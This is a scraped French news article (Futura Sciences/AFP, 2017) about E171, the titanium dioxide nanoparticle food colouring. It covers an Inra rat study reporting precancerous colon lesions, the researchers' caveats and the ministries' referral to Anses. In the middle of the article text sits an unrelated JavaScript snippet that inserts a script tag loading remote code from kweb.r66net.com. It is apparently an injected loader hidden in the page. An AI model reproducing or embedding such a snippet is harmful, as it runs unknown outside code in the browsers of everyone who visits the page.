{"title": "E171, le colorant alimentaire fait de nanoparticules de dioxyde de titane, est-il nocif ?", "newspaper": "Futura Sciences", "author": ["AFP PARIS"], "date_publi": "2017-08-27", "content": "Dans son numero du mois de septembre 2017, le magazine  60 millions de consommateurs  devoile les resultats de son enquete sur la presence de nanoparticules dans les bonbons. En janvier deja, comme Futura l'indiquait, la presence nanoparticules de dioxyde de titane (cachees sous la denomination d'E171) suscitait l'inquietude des autorites sanitaires. Tres utilise dans l'industrie agroalimentaire, cet additif favorise l'apparition de lesions precancereuses dans le colon chez le rat. Trois ministres avaient saisi l'Agence nationale de securite sanitaire de l'alimentation, de l'environnement et du travail (Anses) pour evaluer le risque pour les consommateurs. Ce qu'il faut retenir Le colorant E171 correspond a des nanoparticules. Chez le rat, ces nanoparticules favorisent le developpement de lesions precancereuses. L'Anses a ete saisie et a rendu un avis en avril 2017. Communique de l'AFP paru le 24 janvier 2017 L' additif alimentaire  E171, utilise communement dans l'agroalimentaire pour blanchir et opacifier des dentifrices, confiseries ou plats prepares, induit et promeut la croissance de lesions precancereuses chez le rat, selon une etude menee depuis quatre ans par l'Inra. Cet additif, en fait le dioxyde de  titane , compose a 45 % de  nanoparticules , penetre la paroi de l'intestin du rat en provoquant une baisse de l'activite de son  systeme immunitaire , a explique a l'AFP Eric Hondeau, biologiste, directeur de recherche en physiologie et  toxicologie  alimentaire a l'Inra de Toulouse. Il est coauteur de l'etude publiee le 20 janvier dans la revue britannique  Scientific Reports . Lors d'une exposition orale, dite chronique, sur 100 jours, au E171, un terrain micro-inflammatoire se developpe sur la partie terminale de l'intestin, le  colon , a-t-il ajoute. Au terme de ce delai,  << 40 % des rats etudies presentaient des lesions precancereuses sur le colon >>  a ajoute Fabrice Pierre, coauteur de l'etude, chercheur de l'unite Toxalim au centre de recherche en toxicologie alimentaire. Et sur un lot de rats presentant tous deja des lesions precancereuses, l' ingestion  de E171 durant 100 jours a produit un grossissement des lesions chez 20 % d'entre eux.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Trois ministeres ont saisi l'Anses << Sur la base de ces resultats, nous montrons donc que l'exposition orale au E171 a initie et promu la croissance des lesions precancereuses chez le rat >>  a resume Fabrice Pierre, tout en assortissant ces resultats de bemols importants.  << On ne peut pas conclure sur la base de cette etude quant au caractere  cancerogene  du E171. >>  Elle ne permet pas non plus une extrapolation a l'Homme. << En revanche, les donnees cumulees sur les phases precoces de la  pathologie  vont justifier une etude supplementaire de deux ans sur la  carcinogenese  (origine du  cancer ), avec des lots de 50 rats males et 50 rats femelles >> , comme le prevoient les standards internationaux de la recherche, a ajoute Fabrice Pierre. En juin dernier, l'ONG Agir pour l'environnement avait alerte sur la presence de nanoparticules comme le dioxyde de titane, dans de nombreux produits alimentaires. (c) Gladys_Glez, Istock.com                               Le dioxyde de titane, un cancerogene possible pour l'Homme << Au  regard  des conclusions de cette etude, les ministeres charges de l'Economie, de la Sante et de l' Agriculture  ont decide de saisir conjointement l'Agence nationale de securite sanitaire de l'alimentation, de l'environnement et du travail ( Anses ) afin de determiner si l'additif alimentaire E171 presente un eventuel danger pour les consommateurs >>  precise un communique conjoint des trois ministeres. L'Anses qui mene depuis l'an dernier des travaux sur l'impact sanitaire potentiel des nanomateriaux presents dans l'alimentation devrait rendre son avis fin mars sur le dioxyde de titane. Le  dioxyde de titane  est l'un des cinq  nanomateriaux  de synthese les plus couramment utilises dans des produits de consommation a usage quotidien, comme l'alimentation. En juin dernier, l'ONG Agir pour l'environnement avait alerte sur la presence de nanoparticules comme le dioxyde de titane, dans de nombreux produits alimentaires, et notamment dans plus d'une centaine de confiseries, sans qu'elle soit signalee sur les etiquettes. Les nanoparticules, qui relevent de l'extremement petit (avec des dimensions de l'ordre du  nanometre , soit 50.000 fois plus petites qu'un cheveu), ont la capacite de franchir des barrieres physiologiques comme celles de l' intestin , du  cerveau  ou des  reins . En ce qui concerne le dioxyde de titane, une evaluation par l'agence du cancer de l' OMS  (Circ/Iarc) a conduit a le classer comme cancerogene possible pour l'Homme en cas d'exposition professionnelle par  inhalation , rappelle l'Inra. Interview 5/5 : quels risques representent les nanotechnologies ?                       Les nanoparticules sont d'une infinie variete. Certaines peuvent etre dangereuses tandis que d'autres sont considerees comme inoffensives. Nous avons rencontre Dominique Vinck, sociologue des sciences et de l'innovation, afin qu'il nous explique les risques et les enjeux de ces nanoparticules.                                       Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  dioxyde de titane  |  ou trouver du dioxyde de titane  |  titane alimentaire  |  colorant alimentaire blanc  |  melange de colorant alimentaire  |  nanoparticules  |  nanoparticules medicaments  |  nanoparticules de silice  |  nanoparticules medecine  |  nanoparticules creme solaire", "theme": "sante"}